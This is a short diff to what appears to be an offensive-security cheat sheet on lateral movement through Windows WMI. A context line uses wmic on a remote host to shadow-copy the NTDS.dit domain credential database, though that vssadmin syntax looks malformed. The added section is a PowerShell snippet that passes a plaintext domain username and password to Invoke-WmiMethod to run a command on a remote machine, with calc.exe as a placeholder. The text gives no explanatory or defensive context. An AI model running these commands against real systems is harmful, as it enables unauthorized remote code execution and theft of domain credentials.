@@ -43,3 +43,18 @@ Input:
 Input:
 
     wmic /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
+
+### WMI Via Powershell
+
+    #WMI via Powershell Manually
+    $Username = “Domain\User”
+    $Password = “Password”
+    $IPAddress = “10.0.0.1”
+    $Command = “cmd /c calc.exe”
+    $PSS = ConvertTo-SecureString $Password -AsPlainText -Force
+    $Creds = New-Object system.management.automation.PSCredential $Username,$PSS
+    $WMIResult = Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $IPAddress -
+    Credential $Creds -ArgumentList $Command
+
+    If ($WMIResult.Returnvalue -eq 0) {Write-Output "Executed WMI Command with Success: $Command `n"}
+    else {Write-Output "WMI Command Failed - Could be due to permissions or UAC `n“}
